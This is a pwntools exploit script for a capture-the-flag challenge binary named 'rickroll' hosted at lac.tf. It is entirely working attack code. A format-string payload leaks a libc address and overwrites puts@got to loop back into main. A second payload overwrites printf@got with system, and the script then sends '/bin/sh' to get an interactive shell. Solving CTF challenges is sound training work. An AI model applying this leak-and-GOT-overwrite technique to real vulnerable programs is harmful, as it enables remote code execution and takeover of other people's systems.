#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./rickroll_patched')
libc = ELF('libc.so.6')

host = args.HOST or 'lac.tf'
port = int(args.PORT or 31135)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def send_payload(payload):
        io = start()
        io.sendlineafter(b'Lyrics: ',payload)
        io.recvuntil(b'Never gonna run around and ')
        r = io.recvuntil(b'Never gonna make you cry',drop=True)
        print(r)
        return r

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+149
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

payload = b'%39$p' # leak libc addr
payload += b'%4463c' + b'%8$hn'+p64(exe.got['puts']) # replace puts@got with beginning of main, after the check

io.sendlineafter(b'Lyrics: ',payload)
io.recvuntil(b'around and ')

leak = int(io.recvuntil(' ')[2:],16)

libc.address = leak - (libc.sym['__libc_start_main']+234)
log.info(f'{leak = :x} {libc.address = :x}')

payload = fmtstr_payload(7, {exe.got['printf']: libc.sym['system']})
# payload += b"AAAA"

log.info(f'I want : 0x{libc.sym["system"]:x}')

io.sendlineafter(b'Lyrics: ',payload)

io.sendline(b'/bin/sh\0')

io.interactive()